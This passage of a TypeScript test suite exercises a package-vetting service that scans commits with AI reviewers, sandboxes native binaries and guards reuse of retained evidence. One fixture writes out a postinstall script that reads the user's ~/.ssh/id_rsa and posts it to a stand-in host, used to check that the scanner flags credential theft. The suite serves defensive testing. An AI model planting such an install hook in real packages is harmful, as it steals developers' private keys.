      isolation: "sandbox",
      imageSha256: "c".repeat(64),
      runId: "original-execution",
      reason: "Explicit native fixture",
      startedAt: NOW.toISOString(),
      completedAt: NOW.toISOString(),
      secretsProvided: false,
      egress: "default-deny",
    },
    executionEvidenceSha256s: [digest(executionReport)],
    ...(legacy ? {} : { sourceInventorySha256: sourceSha }),
  });
  expect(composed.result.disposition).toBe(incomplete ? "incomplete" : "clean");
  type Stored = { bytes: Uint8Array; kind: "trace" | "manifest" | "artifact" };
  const objects: Stored[] = [
    { bytes: composed.report, kind: "trace" },
    { bytes: sourceBytes, kind: "manifest" },
    { bytes: inspection.inventory, kind: "manifest" },
    { bytes: executionReport, kind: "trace" },
    ...files
      .filter(
        (file) =>
          composed.result.assessed.dependencyLocks.some(
            (lock) => lock.sha256 === digest(file.bytes),
          ) ||
          composed.result.artifacts.some(
            (artifact) => artifact.sha256 === digest(file.bytes),
          ),
      )
      .map((file) => ({ bytes: file.bytes, kind: "artifact" as const })),
  ];
  const unique = new Map(
    objects.map((object) => [digest(object.bytes), object]),
  );
  const path = `/api/v1/vetting/evidence/${assignment.id}/native-original`;
  const registered = await signedVettingFetch(config.connection, {
    method: "POST",
    path,
    contentType: "application/json",
    timeoutMs: 30000,
    body: new TextEncoder().encode(
      JSON.stringify({
        traceSha256: digest(composed.report),
        objects: [...unique].map(([sha256, object]) => ({
          sha256,
          sizeBytes: object.bytes.length,
          kind: object.kind,
          label: "Native cache fixture",
          contentType:
            object.kind === "artifact"
              ? "application/octet-stream"
              : "application/json",
        })),
      }),
    ),
  });
  expect(registered.status).toBe(201);
  for (const [sha, object] of unique) {
    const uploaded = await signedVettingFetch(config.connection, {
      method: "PUT",
      path: `${path}/${sha}`,
      contentType:
        object.kind === "artifact"
          ? "application/octet-stream"
          : "application/json",
      timeoutMs: 30000,
      body: object.bytes,
    });
    expect(uploaded.status).toBe(200);
  }
  const body = JSON.stringify(composed.result);
  expect(
    await publishResult({
      origin: ORIGIN,
      body,
      approvedSha256: digest(body),
      signer: config.connection,
      journalDirectory: config.journalDirectory,
      at: clock,
      fetch: config.connection.fetch,
    }),
  ).toMatchObject({ outcome: defect ? "rejected" : "accepted" });
  await rm(acquired.directory, { recursive: true, force: true });
  return {
    result: composed.result,
    sourceSha,
    finalSha: inspection.inventorySha256,
    executionSha: digest(executionReport),
    nativeSha: digest(native),
    reportSha: digest(composed.report),
    native,
  };
}

for (const defect of ["artifact", "image", "egress", "uncovered"] as const) {
  test(`an invalid native execution binding (${defect}) cannot produce clean admission`, async () => {
    const original = await retainedNativeFixture(false, false, defect);
    expect(
      (await vetting.getAssessment(original.result.assessmentId))?.state,
    ).toBe("pending");
  });
}

function refuseFreshNativeWork() {
  provider.calls = [];
  provider.up = false;
  const transport = config.connection.fetch;
  if (!transport) throw new Error("Missing transport");
  const attempts: string[] = [];
  config.connection.fetch = (async (input, init) => {
    if (String(input).endsWith("/api/v1/vetting/sandbox")) {
      attempts.push("sandbox");
      return new Response(null, { status: 503 });
    }
    return transport(input, init);
  }) as typeof fetch;
  return attempts;
}

test("protocol-valid native execution stays quarantined without an accepted clean analysis", async () => {
  const native = new Uint8Array(32);
  native.set([0x7f, 0x45, 0x4c, 0x46, 2, 1]);
  native[18] = 0x3e;
  await commit({ "bin/helper": native }, "Native execution transport fixture");
  const transport = config.connection.fetch;
  if (!transport) throw new Error("Missing transport");
  let executions = 0;
  config.connection.fetch = (async (input, init) => {
    if (!String(input).endsWith("/api/v1/vetting/sandbox"))
      return transport(input, init);
    executions++;
    const request = JSON.parse(
      new TextDecoder().decode(init?.body as Uint8Array),
    );
    expect(request.artifactSha256).toBe(digest(native));
    return Response.json({
      schema: "slop-isolated-artifact-v1",
      runId: "00000000-0000-4000-8000-000000000001",
      startedAt: NOW.toISOString(),
      completedAt: NOW.toISOString(),
      imageSha256: "c".repeat(64),
      sourceSha: "d".repeat(40),
      artifactSha256: request.artifactSha256,
      interpreter: "binary",
      internetEnabled: false,
      status: "exited",
      exitCode: 0,
      stdoutBase64: "",
      stderrBase64: "",
      outputComplete: true,
    });
  }) as typeof fetch;
  const pass = await runScanPass(config);
  expect(pass.assessments[0]).toMatchObject({
    state: "published",
    disposition: "incomplete",
    outcome: "accepted",
  });
  const assessment = await vetting.getAssessment(
    pass.assessments[0].assessmentId,
  );
  if (!assessment?.result || !isScanResult(assessment.result))
    throw new Error("Missing native result");
  expect(executions).toBe(1);
  expect(assessment.result.artifacts[0]).toMatchObject({
    state: "quarantined",
    analysis: "pending",
    requestedExecution: true,
  });
  expect(await retained.evidence.retained(assessment.result)).toBe(true);
});

test("identical native inputs reuse original execution and reviews before calling the sandbox", async () => {
  const original = await retainedNativeFixture();
  expect(original.sourceSha).not.toBe(original.finalSha);
  const attempts = refuseFreshNativeWork();
  for (const message of [
    "First identical native successor",
    "Second identical native successor",
  ]) {
    emptyCommit(message);
    await requestInvestigation();
    const pass = await runScanPass(config);
    expect(pass.assessments[0]).toMatchObject({
      state: "published",
      outcome: "accepted",
    });
    const current = await vetting.getAssessment(
      pass.assessments[0].assessmentId,
    );
    expect(current?.result).toMatchObject({
      reusedAssessmentId: original.result.assessmentId,
      assessed: {
        commitSha,
        sourceInventorySha256: original.sourceSha,
        inputManifestSha256: original.finalSha,
      },
      scan: original.result.scan,
      execution: original.result.execution,
      primaryReview: original.result.primaryReview,
      artifacts: original.result.artifacts,
    });
    if (!current?.result) throw new Error("Missing reused result");
    expect(await retained.evidence.retained(current.result)).toBe(true);
  }
  expect(attempts).toEqual([]);
  expect(provider.calls).toEqual([]);
});

test("native reuse intake rechecks the source binding even without a valid lookup", async () => {
  const original = await retainedNativeFixture();
  emptyCommit("Native successor with altered source binding");
  const project = await projects.getProject("open-registry");
  if (!project) throw new Error("Missing project");
  expect(
    await queueAutomaticScan(vettingDeps(), project, "Altered source binding"),
  ).toBe("queued");
  const assignment = (await vetting.pendingAssessments())[0];
  const result = {
    ...original.result,
    assessmentId: assignment.id,
    revision: assignment.revision,
    manifestSha256: assignment.manifestSha256,
    reusedAssessmentId: original.result.assessmentId,
    assessed: {
      ...original.result.assessed,
      commitSha,
      sourceInventorySha256: "f".repeat(64),
    },
  };
  const body = JSON.stringify(result);
  expect(
    await publishResult({
      origin: ORIGIN,
      body,
      approvedSha256: digest(body),
      signer: config.connection,
      journalDirectory: config.journalDirectory,
      at: clock,
      fetch: config.connection.fetch,
    }),
  ).toMatchObject({ outcome: "rejected", httpStatus: 422 });
  expect((await vetting.getAssessment(assignment.id))?.state).toBe("pending");
});

test("an incomplete retained native analysis is never reused as clean", async () => {
  const original = await retainedNativeFixture(false, true);
  expect(await retained.evidence.retained(original.result)).toBe(true);
  const attempts = refuseFreshNativeWork();
  emptyCommit("Same native bytes after incomplete analysis");
  await requestInvestigation();
  const pass = await runScanPass(config);
  expect(pass.assessments[0]).toMatchObject({
    state: "retry",
    step: "isolated-execution",
  });
  expect(attempts).toEqual(["sandbox"]);
  expect(provider.calls).toEqual([]);
  expect(
    (await vetting.getAssessment(original.result.assessmentId))?.state,
  ).toBe("incomplete");
});

for (const change of ["bytes", "path", "legacy"] as const) {
  test(`native reuse refuses ${change} without reusing an unrelated final inventory`, async () => {
    const original = await retainedNativeFixture(change === "legacy");
    const attempts = refuseFreshNativeWork();
    if (change === "bytes") {
      original.native[31] = 1;
      await commit({ "bin/helper": original.native }, "Changed native bytes");
    } else if (change === "path")
      await commit({ "bin/second-helper": original.native }, "New native path");
    else emptyCommit("Legacy native result lacks source binding");
    await requestInvestigation();
    const pass = await runScanPass(config);
    expect(pass.assessments[0]).toMatchObject({
      state: "retry",
      step: "isolated-execution",
    });
    expect(attempts).toEqual(["sandbox"]);
    expect(provider.calls).toEqual([]);
  });
}

for (const kind of [
  "sourceSha",
  "finalSha",
  "executionSha",
  "reportSha",
  "nativeSha",
] as const) {
  for (const damage of ["missing", "corrupt"] as const) {
    test(`native reuse refuses ${damage} retained ${kind} evidence`, async () => {
      const original = await retainedNativeFixture();
      const row = sqlite
        .query(
          "SELECT object_key, sha256, storage, size_bytes FROM vetting_evidence_objects WHERE assessment_id=? AND sha256=?",
        )
        .get(original.result.assessmentId, original[kind]) as {
        object_key: string;
        sha256: string;
        storage: string;
        size_bytes: number;
      };
      const key = evidenceLocation(row);
      if (damage === "missing") await retained.bucket.delete(key);
      else {
        const object = await retained.bucket.head(key);
        if (!object) throw new Error("Missing fixture evidence");
        await retained.bucket.put(
          key,
          new Uint8Array(row.size_bytes).fill(42),
          // Deliberately bypass the fixture's immutable-write option to
          // simulate storage corruption, not an application upload.
          {
            httpMetadata: { contentType: "application/json" },
            customMetadata: object.customMetadata,
          } as Parameters<typeof retained.bucket.put>[2],
        );
      }
      const attempts = refuseFreshNativeWork();
      emptyCommit(`Native successor with ${damage} ${kind}`);
      await requestInvestigation();
      const pass = await runScanPass(config);
      expect(pass.assessments[0]).toMatchObject({
        state: "retry",
        step: "isolated-execution",
      });
      expect(attempts).toEqual(["sandbox"]);
      expect(provider.calls).toEqual([]);
    });
  }
}

test("scan reuse does not disclose a cached result without a service signature", async () => {
  const first = await runScanPass(config);
  const transport = config.connection.fetch;
  if (!transport) throw new Error("Missing fixture transport");
  const response = await transport(`${ORIGIN}/api/v1/vetting/reuse`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      assessmentId: first.assessments[0].assessmentId,
      inputManifestSha256: "a".repeat(64),
      policyVersion: config.policyVersion,
    }),
  });
  expect(response.status).toBe(401);
  expect(await response.json()).toMatchObject({ error: "invalid_signature" });
});

test("scan reuse binds empty new commits to the original retained clean result without provider calls", async () => {
  const first = await runScanPass(config);
  const original = await vetting.getAssessment(
    first.assessments[0].assessmentId,
  );
  if (!original?.result || !isScanResult(original.result))
    throw new Error("Missing original scan");
  const originalSnapshot = structuredClone(original);
  expect((await activate()).status).toBe(200);
  const project = await projects.getProject("open-registry");
  if (!project) throw new Error("Missing current project");
  provider.calls = [];
  provider.up = false;
  for (const message of ["First empty commit", "Second empty commit"]) {
    emptyCommit(message);
    await requestInvestigation();
    const pass = await runScanPass(config);
    expect(pass.assessments[0]).toMatchObject({
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      evidence: "retained",
    });
    const current = await vetting.getAssessment(
      pass.assessments[0].assessmentId,
    );
    expect(current?.commitSha).toBe(commitSha);
    expect(current?.revision).toBe(project.revision);
    expect(current?.manifestSha256).toBe(project.manifestSha256);
    expect(current?.result).toMatchObject({
      assessmentId: current?.id,
      reusedAssessmentId: original.id,
      assessed: {
        commitSha,
        inputManifestSha256: original.result.assessed.inputManifestSha256,
      },
      scan: original.result.scan,
      primaryReview: original.result.primaryReview,
    });
    if (!current?.result) throw new Error("Missing reused scan");
    expect(await retained.evidence.retained(current.result)).toBe(true);
  }
  expect(provider.calls).toEqual([]);
  expect(await vetting.getAssessment(original.id)).toEqual(originalSnapshot);
});

test("scan reuse refuses changed executable bytes and reviews the new inventory", async () => {
  const first = await runScanPass(config);
  const original = await vetting.getAssessment(
    first.assessments[0].assessmentId,
  );
  provider.calls = [];
  await commit(
    {
      "src/index.ts":
        "export const parse = (value: string) => value.toUpperCase();\n",
    },
    "Change executable source",
  );
  await requestInvestigation();
  clock = new Date(clock.getTime() + 1000);
  const next = await runScanPass(config);
  const current = await vetting.getAssessment(next.assessments[0].assessmentId);
  expect(current?.result).toMatchObject({ reusedAssessmentId: null });
  expect(current?.commitSha).toBe(commitSha);
  expect(
    current?.result && isScanResult(current.result)
      ? current.result.assessed.inputManifestSha256
      : null,
  ).not.toBe(
    original?.result && isScanResult(original.result)
      ? original.result.assessed.inputManifestSha256
      : null,
  );
  expect(provider.calls.map((call) => call.path)).toEqual([
    "/anthropic/v1/messages",
  ]);
});

for (const change of ["policy", "template"] as const) {
  test(`scan reuse refuses a changed ${change} even with unchanged repository bytes`, async () => {
    await runScanPass(config);
    provider.calls = [];
    emptyCommit(`New commit under changed ${change}`);
    if (change === "policy") config.policyVersion = "scan-policy-2";
    else {
      templateInputs.acceptedRevisions = ["1", "2"];
      templateSha256 = digest(JSON.stringify(templateInputs));
    }
    await requestInvestigation();
    const next = await runScanPass(config);
    const current = await vetting.getAssessment(
      next.assessments[0].assessmentId,
    );
    expect(current?.result).toMatchObject({ reusedAssessmentId: null });
    expect(provider.calls.map((call) => call.path)).toEqual([
      "/anthropic/v1/messages",
    ]);
  });
}

for (const originalKind of ["text", "native"] as const) {
  test(`scan reuse of ${originalKind} is revalidated at publication after a two-flag pause`, async () => {
    if (originalKind === "native") await retainedNativeFixture();
    else await runScanPass(config);
    expect((await activate()).status).toBe(200);
    provider.calls = [];
    emptyCommit("Same bytes before pause");
    await requestInvestigation();
    const transport = config.connection.fetch;
    if (!transport) throw new Error("Missing fixture transport");
    let paused = false;
    config.connection.fetch = (async (input, init) => {
      const response = await transport(input, init);
      if (String(input).endsWith("/api/v1/vetting/reuse") && response.ok) {
        const value = await response.clone().json();
        if (value.result !== null && !paused) {
          paused = true;
          expect((await flag("alice")).status).toBe(201);
          expect((await flag("bob")).status).toBe(201);
        }
      }
      return response;
    }) as typeof fetch;
    const pass = await runScanPass(config);
    expect(paused).toBe(true);
    expect(pass.assessments[0]).toMatchObject({
      state: "published",
      outcome: "rejected",
    });
    expect(provider.calls).toEqual([]);
    expect(await flags.activeFlags(clock)).toHaveLength(2);
    expect(
      projectRestriction("open-registry", await projects.listEnforcements())
        .state,
    ).toBe("quarantined");
  });
}

test("scan reuse requires the original report to remain in private R2", async () => {
  const first = await runScanPass(config);
  const original = await vetting.getAssessment(
    first.assessments[0].assessmentId,
  );
  if (!original) throw new Error("Missing original scan");
  const object = sqlite
    .query(
      "SELECT object_key, sha256, storage FROM vetting_evidence_objects WHERE assessment_id = ? AND kind = 'trace' LIMIT 1",
    )
    .get(original.id) as {
    object_key: string;
    sha256: string;
    storage: string;
  };
  await retained.bucket.delete(evidenceLocation(object));
  provider.calls = [];
  emptyCommit("Same source after evidence loss");
  await requestInvestigation();
  const next = await runScanPass(config);
  const current = await vetting.getAssessment(next.assessments[0].assessmentId);
  expect(current?.result).toMatchObject({ reusedAssessmentId: null });
  expect(provider.calls.map((call) => call.path)).toEqual([
    "/anthropic/v1/messages",
  ]);
  expect(next.assessments[0]).toMatchObject({ outcome: "accepted" });
});

for (const field of [
  "commitSha",
  "sourceInventorySha256",
  "inputManifestSha256",
] as const) {
  test(`scan reuse rejects a mismatched ${field} before publishing or reviewing`, async () => {
    await runScanPass(config);
    provider.calls = [];
    emptyCommit("Same source with mismatched lookup response");
    await requestInvestigation();
    const transport = config.connection.fetch;
    if (!transport) throw new Error("Missing fixture transport");
    config.connection.fetch = (async (input, init) => {
      const response = await transport(input, init);
      if (!String(input).endsWith("/api/v1/vetting/reuse") || !response.ok)
        return response;
      const value = await response.json();
      value.result.assessed[field] = "f".repeat(
        field === "commitSha" ? 40 : 64,
      );
      return Response.json(value);
    }) as typeof fetch;
    const pass = await runScanPass(config);
    expect(pass.assessments[0]).toMatchObject({
      state: "retry",
      step: "reuse",
    });
    expect(provider.calls).toEqual([]);
    expect(
      (await vetting.pendingAssessments()).map((row) => row.commitSha),
    ).toContain(commitSha);
  });
}

for (const status of [404, 503]) {
  test(`scan reuse lookup HTTP ${status} leaves pending work without a provider fallback`, async () => {
    const transport = config.connection.fetch;
    if (!transport) throw new Error("Missing fixture transport");
    config.connection.fetch = (async (input, init) =>
      String(input).endsWith("/api/v1/vetting/reuse")
        ? new Response(null, { status })
        : transport(input, init)) as typeof fetch;
    const pass = await runScanPass(config);
    expect(pass.assessments[0]).toMatchObject({
      state: "retry",
      step: "reuse",
    });
    expect(provider.calls).toEqual([]);
    expect(await readdir(config.journalDirectory)).toEqual([]);
    expect((await vetting.pendingAssessments()).map((row) => row.id)).toContain(
      pass.assessments[0].assessmentId,
    );
  });
}

test("a failed specialist is a service failure: nothing is published and the scan retries", async () => {
  provider.primary = "findings";
  provider.specialistUp = false;
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments[0]).toEqual({
    assessmentId,
    state: "retry",
    step: "specialist-review",
  });
  expect(provider.calls.map((call) => call.path)).toEqual([
    "/anthropic/v1/messages",
    "/v1/responses",
  ]);
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
  expect(await readdir(config.journalDirectory)).toEqual([]);
});

const sessionRequest = (
  method: string,
  path: string,
  actor: string,
  body?: unknown,
) =>
  new Request(`${ORIGIN}/api/v1/${path}`, {
    method,
    headers: {
      "x-test-actor": actor,
      ...(body === undefined
        ? {}
        : { "content-type": "application/json", origin: ORIGIN }),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
const publicVetting = async () =>
  (
    await (
      await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`))
    ).json()
  ).vetting;
const flag = (actor: string) =>
  flagApi(
    sessionRequest("POST", "project-flags/open-registry", actor, {
      category: "credential-theft",
      evidence:
        "scripts/postinstall.js reads ~/.ssh/id_rsa and posts it to a remote host",
      evidenceUrl:
        "https://github.com/example/open-registry/blob/main/scripts/postinstall.js",
    }),
  );
const RISKY_FILES = {
  "package.json": JSON.stringify({
    name: "fixture",
    scripts: { test: "bun test", postinstall: "node scripts/postinstall.js" },
  }),
  "scripts/postinstall.js":
    "const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\nfetch('https://collector.invalid', { method: 'POST', body: key });\n",
};

test("a clean result is never published without its retained evidence; the next pass retries", async () => {
  provider.evidenceUp = false;
  const failed = await runScanPass(config);
  const [{ assessmentId }] = failed.assessments;
  expect(failed.assessments[0]).toEqual({
    assessmentId,
    state: "retry",
    step: "evidence",
  });
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
  expect(await readdir(config.journalDirectory)).toEqual([]);

  provider.evidenceUp = true;
  clock = new Date(NOW.getTime() + 60_000);
  expect((await runScanPass(config)).assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  expect((await activate()).status).toBe(200);
});

test("an incomplete result is published although the evidence store fails, so the models are not called again", async () => {
  // A committed binary keeps the scan incomplete and quarantined.
  await commit({ "bin/tool.wasm": "\0asm\u0001\0\0\0" }, "Add a binary");
  provider.evidenceUp = false;
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
      specialist: true,
      evidence: "failed",
    },
  ]);
  // A binary needs the specialist; each model runs once.
  expect(provider.calls.map((call) => call.model)).toEqual([
    "claude-opus-5.5",
    "gpt-6.1-sol",
  ]);
  expect((await vetting.getAssessment(assessmentId))?.state).toBe("incomplete");
  provider.calls = [];
  expect((await runScanPass(config)).assessments).toEqual([]);
  expect(provider.calls).toEqual([]);
});

test("malicious-code detection: risky new content is flagged, escalated to the specialist and kept quarantined", async () => {
  await runScanPass(config);
  expect((await activate()).status).toBe(200);

  // A new commit adds an install hook that steals a key.
  await commit(RISKY_FILES, "Add install hook");
  expect((await publicVetting()).state).toBe("cleared");
  await requestInvestigation();
  provider.primary = "malicious-suspected";
  provider.calls = [];
  clock = new Date(NOW.getTime() + 60_000);
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
      specialist: true,
      evidence: "retained",
    },
  ]);
  // The specialist runs only because the primary review was high risk.
  expect(provider.calls.map((call) => call.model)).toEqual([
    "claude-opus-5.5",
    "gpt-6.1-sol",
  ]);
  const assessment = await vetting.getAssessment(assessmentId);
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("no bounded result");
  expect(assessment?.state).toBe("incomplete");
  expect(result.checks["credential-theft"]).toBe("flagged");
  expect(result.primaryReview.risk).toBe("high");
  expect(result.specialistReview).toMatchObject({
    provider: "surplus",
    model: "gpt-6.1-sol",
  });
  // A model label alone never bans: a moderator confirms malice.
  expect(result.confirmation).toBeNull();
  expect((await publicVetting()).state).toBe("quarantined");
  expect(
    sqlite
      .query(
        "SELECT kind FROM vetting_evidence_objects WHERE assessment_id = ? AND kind = 'trace'",
      )
      .all(assessmentId),
  ).toEqual([{ kind: "trace" }]);
});

test("a two-flag pause is reinstated automatically after the service's clean fresh scan", async () => {
  await runScanPass(config);
  expect((await activate()).status).toBe(200);

  // An unfinished scan must not block a later scan covering new flags.
  await commit({ "README.md": "# Updated fixture\n" }, "Update public guide");
  await requestInvestigation();
  provider.up = false;
  const interrupted = await runScanPass(config);
  const oldId = interrupted.assessments[0].assessmentId;
  expect((await vetting.getAssessment(oldId))?.state).toBe("pending");
  provider.up = true;

  expect((await flag("alice")).status).toBe(201);
  clock = new Date(NOW.getTime() + 60_000);
  expect(await (await flag("bob")).json()).toMatchObject({
    paused: true,
    pausedByFlags: true,
    freshScan: "queued",
  });
  expect(
    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
      .status,
  ).toBe(410);

  // An older app can write the same flags in a different order during rollout.
  // The database must refuse that duplicate before it supersedes this scan.
  const pending = await vetting.pendingAssessments();
  expect(() =>
    sqlite
      .query(
        `INSERT INTO vetting_assessments
         (id, project_id, revision, manifest_sha256, content_sha256, commit_sha,
          template_sha256, requested_by_github_id, requested_by_github_login,
          requested_at, request_reason, state, flag_ids)
         SELECT ?, project_id, revision, manifest_sha256, content_sha256, commit_sha,
                template_sha256, requested_by_github_id, requested_by_github_login,
                requested_at, request_reason, state,
                (SELECT json_group_array(value) FROM
                  (SELECT value FROM json_each(a.flag_ids) ORDER BY value DESC))
           FROM vetting_assessments a WHERE id = ?`,
      )
      .run(`vet_${"f".repeat(32)}`, pending[0].id),
  ).toThrow(/vetting_assessments.current_pending/u);

  clock = new Date(NOW.getTime() + 120_000);
  const report = await runScanPass(config);
  const [{ assessmentId }] = report.assessments;
  expect(assessmentId).not.toBe(oldId);
  expect((await vetting.getAssessment(oldId))?.state).toBe("pending");
  expect(report.assessments).toEqual([
    {
      assessmentId,
      state: "published",
      disposition: "clean",
      outcome: "accepted",
      specialist: false,
      evidence: "retained",
    },
  ]);
  const record = (await projects.listEnforcements())
    .filter((entry) => entry.projectId === "open-registry")
    .at(-1);
  expect(record).toMatchObject({
    action: "reinstate",
    stateAfter: "clear",
    actorRole: "vetting-service",
    systemIssuer: { rule: "clean-fresh-scan-after-flags", assessmentId },
  });
  expect(
    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
      .status,
  ).toBe(200);
  expect(await flags.activeFlags(clock)).toEqual([]);
});

test("an unpinned endpoint or model fails closed before the queue or any provider is contacted", async () => {
  const contacted: string[] = [];
  const counting = {
    ...config.connection,
    fetch: ((input: string | URL | Request, init?: RequestInit) => {
      contacted.push(new URL(String(input)).host);
      return config.connection.fetch?.(input, init) as Promise<Response>;
    }) as typeof fetch,
  };
  for (const [primary, specialist] of [
    // The Surplus key must never reach the providers' own APIs.
    [
      { ...config.primary, endpoint: "https://api.anthropic.com/v1/messages" },
      config.specialist,
    ],
    [
      config.primary,
      { ...config.specialist, endpoint: "https://api.openai.com/v1/responses" },
    ],
    [{ ...config.primary, model: "claude-opus-5" }, config.specialist],
    [config.primary, { ...config.specialist, model: "gpt-6.1" }],
    // The specialist never stands in for the primary review.
    [config.specialist, config.primary],
  ] as [ScannerProfile, ScannerProfile][]) {
    await expect(
      runScanPass({ ...config, connection: counting, primary, specialist }),
    ).rejects.toThrow(
      /Unapproved scanner profile|must be Surplus claude-opus-5\.5/,
    );
  }
  expect(contacted).toEqual([]);
  expect(provider.calls).toEqual([]);
  expect(await vetting.pendingAssessments()).toEqual([]);
});

test("unsupported artifacts produce an incomplete scan rather than aborting the scan pass", async () => {
  await commit(
    Object.fromEntries(
      Array.from({ length: 101 }, (_, index) => [
        `artifacts/unsupported-${index}.exe`,
        `MZharmless unsupported fixture ${index}`,
      ]),
    ),
    "Add unsupported artifact fixtures",
  );
  const report = await runScanPass(config);
  expect(report.assessments).toHaveLength(1);
  expect(report.assessments[0]).toMatchObject({
    state: "published",
    disposition: "incomplete",
    outcome: "accepted",
  });
  const assessment = await vetting.getAssessment(
    report.assessments[0].assessmentId,
  );
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("no bounded result");
  expect(result.artifacts).toHaveLength(101);
  expect(
    result.artifacts.every((artifact) => artifact.state === "quarantined"),
  ).toBe(true);
  expect((await activate()).status).toBe(422);
  expect((await runScanPass(config)).assessments).toEqual([]);
}, 30000);

/**
 * A harmless static Linux x86-64 program: write(1, "isolated\n") and exit(0).
 * One read-execute segment at 0x400000; entry 0x400078.
 */
function nativeProbe(): Uint8Array {
  const message = [...new TextEncoder().encode("isolated\n")];
  const code = [
    ...[0xb8, 1, 0, 0, 0], // mov eax, 1 (write)
    ...[0xbf, 1, 0, 0, 0], // mov edi, 1 (stdout)
    ...[0x48, 0x8d, 0x35, 0x10, 0, 0, 0], // lea rsi, [rip + 16]
    ...[0xba, message.length, 0, 0, 0], // mov edx, length
    ...[0x0f, 0x05], // syscall
    ...[0xb8, 60, 0, 0, 0], // mov eax, 60 (exit)
    ...[0x31, 0xff], // xor edi, edi
    ...[0x0f, 0x05], // syscall
  ];
  const size = 64 + 56 + code.length + message.length;
  const bytes = new Uint8Array(size);
  const view = new DataView(bytes.buffer);
  bytes.set([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]);
  view.setUint16(16, 2, true); // ET_EXEC
  view.setUint16(18, 0x3e, true); // x86-64
  view.setUint32(20, 1, true);
  view.setBigUint64(24, 0x400078n, true);
  view.setBigUint64(32, 64n, true);
  view.setUint16(52, 64, true);
  view.setUint16(54, 56, true);
  view.setUint16(56, 1, true);
  view.setUint32(64, 1, true); // PT_LOAD
  view.setUint32(68, 5, true); // read + execute
  view.setBigUint64(80, 0x400000n, true);
  view.setBigUint64(88, 0x400000n, true);
  view.setBigUint64(96, BigInt(size), true);
  view.setBigUint64(104, BigInt(size), true);
  view.setBigUint64(112, 0x1000n, true);
  bytes.set([...code, ...message], 120);
  return bytes;
}

test.skipIf(!SANDBOX_URL)(
  "a native artifact runs only in the real disposable sandbox and stays quarantined",
  async () => {
    const probe = nativeProbe();
    await commit(
      {
        "bin/probe": probe,
        "artifacts/unsupported.exe": "MZharmless unsupported fixture",
      },
      "Add native and unsupported artifacts",
    );
    const report = await runScanPass(config);
    expect(report.assessments).toHaveLength(1);
    expect(report.assessments[0]).toMatchObject({
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
    });
    const { assessmentId } = report.assessments[0];
    const result = (await vetting.getAssessment(assessmentId))?.result;
    if (!result || !isScanResult(result)) throw new Error("no bounded result");
    // The released identity comes from the runner, never from the controller.
    expect(result.execution).toMatchObject({
      isolation: "sandbox",
      imageSha256: process.env.RUNNER_IMAGE_SHA256,
      secretsProvided: false,
      egress: "default-deny",
    });
    const native = result.artifacts.find((item) => item.path === "bin/probe");
    expect(native).toMatchObject({
      sha256: digest(probe),
      state: "quarantined",
      requestedExecution: true,
    });
    expect(
      result.artifacts.find(
        (item) => item.path === "artifacts/unsupported.exe",
      ),
    ).toMatchObject({ state: "quarantined", requestedExecution: false });
    expect(result.visibilityGaps).not.toHaveLength(0);
    // The reviewer read the bounded execution output as an inventory item.
    expect(reviewedItems.some((item) => item.id.startsWith("execution:"))).toBe(
      true,
    );
    expect(
      reviewedItems.find((item) => item.id.startsWith("execution:"))?.text,
    ).toContain('"stdout":"isolated\\n"');
    expect((await activate()).status).toBe(422);
    expect((await runScanPass(config)).assessments).toEqual([]);
  },
  120000,
);

for (const evidenceUp of [true, false]) {
  test(`an acquisition policy refusal completes as incomplete and notifies each owner once (evidence available: ${evidenceUp})`, async () => {
    // A tree path with a control character is outside the source policy.
    const blob = gitWith("content\n", "hash-object", "-w", "--stdin")
      .toString()
      .trim();
    const tree = gitWith(`100644 blob ${blob}\tbad\u0001name\n`, "mktree")
      .toString()
      .trim();
    commitSha = git(
      "-c",
      "user.name=Fixture",
      "-c",
      "user.email=fixture@example.invalid",
      "commit-tree",
      tree,
      "-m",
      "Invalid source path",
    )
      .toString()
      .trim();
    git("update-ref", "refs/heads/main", commitSha);
    provider.evidenceUp = evidenceUp;
    const pass = await runScanPass(config);
    expect(pass.assessments).toHaveLength(1);
    const outcome = pass.assessments[0];
    expect(outcome).toMatchObject({
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
      specialist: false,
      evidence: evidenceUp ? "retained" : "failed",
    });
    const assessment = await vetting.getAssessment(outcome.assessmentId);
    expect(assessment?.state).toBe("incomplete");
    const result = assessment?.result;
    if (!assessment || !result || !isScanResult(result))
      throw new Error("Missing incomplete scan result");
    expect(result.assessed.commitSha).toBe(commitSha);
    expect(result.assessed.templateSha256).toBe(templateSha256);
    expect(result.visibilityGaps).toHaveLength(1);
    for (const coverage of Object.values(result.coverage))
      expect(coverage).toEqual({ state: "unsupported", items: 0 });
    expect(
      Object.values(result.checks).every((state) => state === "not-run"),
    ).toBe(true);
    expect(result.primaryReview).toMatchObject({
      status: "not-started",
      verdict: null,
      risk: null,
      findingCount: 0,
    });
    expect(result.specialistReview).toBeNull();
    expect(provider.calls).toEqual([]);
    expect(await retained.evidence.retained(result)).toBe(evidenceUp);
    expect((await activate()).status).toBe(422);
    const notices = () =>
      sqlite
        .query(
          "SELECT recipient_github_id, action_path FROM notifications WHERE kind='project_scan_failed' ORDER BY recipient_github_id",
        )
        .all();
    const project = await projects.getProject("open-registry");
    if (!project) throw new Error("Missing fixture project");
    const owners = [
      ...new Set([
        APPLICANT.githubId,
        String(project.manifest.steward.github.actorId),
      ]),
